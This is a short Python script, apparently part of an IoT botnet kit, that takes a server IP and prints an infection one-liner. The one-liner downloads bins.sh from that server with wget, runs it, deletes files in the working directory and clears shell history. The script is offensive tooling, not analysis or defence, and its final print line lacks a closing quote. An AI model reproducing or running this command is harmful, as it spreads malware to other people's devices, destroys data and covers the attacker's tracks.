import time
import subprocess
import warnings
import fileinput
import sys
if len(sys.argv) < 2:
    print("\x1b[31m[SYNTAX ERROR]\r\n Usage: python %s [Server IP] \x1b[0m" % sys.argv[0])
    sys.exit()
raw_input("[+] Press Enter To Build Your Payload [+]")
ip = sys.argv[1]
def run(cmd):
    subprocess.call(cmd, shell=True)

print("[+] You Need To Make A bins.sh [+]")



print("cd /tmp || cd /run || cd /; wget http://" + ip + "/SBIDIOT/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf *; history -c)